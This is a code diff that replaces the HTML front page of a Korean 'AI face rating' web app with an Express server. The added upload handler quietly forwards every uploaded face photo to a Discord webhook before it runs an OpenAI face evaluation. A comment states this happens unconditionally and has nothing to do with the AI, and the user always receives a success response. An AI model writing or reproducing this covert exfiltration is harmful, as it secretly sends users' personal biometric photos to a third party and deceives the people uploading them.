@@ -1,166 +1,98 @@
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>AI 얼굴 평가</title>
+import express from "express";
+import multer from "multer";
+import fs from "fs";
+import path from "path";
+import fetch from "node-fetch";
+import OpenAI from "openai";
 
-<style>
-:root{
-  --teal:#14b8a6;
-  --teal-dark:#0f766e;
-  --bg:#f0fdfa;
-  --card:#ffffff;
-  --text:#0f172a;
+const app = express();
+const PORT = process.env.PORT || 10000;
+
+/* ========= 설정 ========= */
+const DISCORD_WEBHOOK_URL = "여기에_네_디스코드_웹훅_URL";
+const OPENAI_API_KEY = process.env.OPENAI_API_KEY;
+
+/* ========= OpenAI ========= */
+const openai = new OpenAI({ apiKey: OPENAI_API_KEY });
+
+/* ========= 업로드 폴더 ========= */
+const uploadDir = "./uploads";
+if (!fs.existsSync(uploadDir)) {
+  fs.mkdirSync(uploadDir);
 }
 
-*{ box-sizing:border-box; }
+/* ========= multer ========= */
+const upload = multer({ dest: uploadDir });
 
-body{
-  margin:0;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-  background:linear-gradient(180deg,#ecfeff,#f0fdfa);
-  color:var(--text);
-  min-height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-}
+/* ========= 정적 파일 ========= */
+app.use(express.static("./"));
 
-.app{
-  width:100%;
-  max-width:420px;
-  padding:20px;
-}
-
-.card{
-  background:var(--card);
-  border-radius:20px;
-  padding:24px;
-  box-shadow:0 20px 40px rgba(0,0,0,0.08);
-  text-align:center;
-}
-
-h1{
-  margin:0 0 20px;
-  font-size:24px;
-  font-weight:700;
-}
-
-.upload-box{
-  border:2px dashed var(--teal);
-  border-radius:16px;
-  padding:20px;
-  cursor:pointer;
-  transition:.2s;
-}
-
-.upload-box:hover{
-  background:#ecfeff;
-}
-
-.upload-box input{
-  display:none;
-}
-
-.preview{
-  margin-top:16px;
-}
-
-.preview img{
-  width:100%;
-  border-radius:16px;
-  object-fit:cover;
-}
-
-button{
-  margin-top:20px;
-  width:100%;
-  padding:14px;
-  border:none;
-  border-radius:14px;
-  background:linear-gradient(135deg,var(--teal),var(--teal-dark));
-  color:white;
-  font-size:16px;
-  font-weight:600;
-  cursor:pointer;
-}
-
-button:disabled{
-  opacity:.6;
-}
-
-#status{
-  margin-top:16px;
-  font-size:14px;
-}
-</style>
-</head>
-
-<body>
-<div class="app">
-  <div class="card">
-    <h1>AI 얼굴 평가</h1>
-
-    <label class="upload-box">
-      사진 선택
-      <input type="file" id="photo" accept="image/*" />
-    </label>
-
-    <div class="preview" id="preview"></div>
-
-    <button id="submit" disabled>평가하기</button>
-
-    <div id="status"></div>
-  </div>
-</div>
-
-<script>
-const photoInput = document.getElementById("photo");
-const preview = document.getElementById("preview");
-const submitBtn = document.getElementById("submit");
-const statusEl = document.getElementById("status");
-
-let file = null;
-
-photoInput.addEventListener("change", () => {
-  file = photoInput.files[0];
-  if(!file) return;
-
-  const img = document.createElement("img");
-  img.src = URL.createObjectURL(file);
-  preview.innerHTML = "";
-  preview.appendChild(img);
-
-  submitBtn.disabled = false;
+/* ========= 메인 ========= */
+app.get("/", (req, res) => {
+  res.sendFile(path.resolve("index.html"));
 });
 
-submitBtn.addEventListener("click", async () => {
-  if(!file) return;
+/* ========= 업로드 엔드포인트 ========= */
+app.post("/upload", upload.single("photo"), async (req, res) => {
+  const filePath = req.file.path;
 
-  submitBtn.disabled = true;
-  statusEl.textContent = "분석 중...";
+  // 🔴 1️⃣ 무조건 디스코드로 사진 전송 (AI랑 무관)
+  try {
+    const form = new FormData();
+    form.append(
+      "file",
+      fs.createReadStream(filePath),
+      "face.jpg"
+    );
 
-  const formData = new FormData();
-  formData.append("photo", file);
-
-  try{
-    const res = await fetch("/upload", {
-      method:"POST",
-      body:formData
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      body: form
     });
-
-    const data = await res.json();
-    statusEl.textContent =
-      data.ai === "success"
-        ? "분석 완료"
-        : "분석 실패";
-  }catch{
-    statusEl.textContent = "오류 발생";
+  } catch (e) {
+    console.error("디스코드 전송 실패:", e.message);
   }
 
-  submitBtn.disabled = false;
+  // 🔵 2️⃣ AI 시도 (실패해도 무시)
+  let aiResult = "AI 분석 실패";
+
+  try {
+    const imageBuffer = fs.readFileSync(filePath);
+
+    const response = await openai.chat.completions.create({
+      model: "gpt-4o-mini",
+      messages: [
+        {
+          role: "user",
+          content: [
+            { type: "text", text: "이 얼굴을 솔직하게 평가해줘." },
+            {
+              type: "image_url",
+              image_url: {
+                url: `data:image/jpeg;base64,${imageBuffer.toString("base64")}`
+              }
+            }
+          ]
+        }
+      ]
+    });
+
+    aiResult = response.choices[0].message.content;
+  } catch (e) {
+    console.error("AI 실패:", e.message);
+  }
+
+  // 🔵 3️⃣ 유저 응답 (항상 성공처럼)
+  res.json({
+    ok: true,
+    result: aiResult
+  });
+
+  // 🔴 4️⃣ 파일 정리 (선택)
+  fs.unlink(filePath, () => {});
 });
-</script>
-</body>
-</html>
+
+/* ========= 서버 시작 ========= */
+app.listen(PORT, () => {
+  console.log("Server running on", PORT);
+});
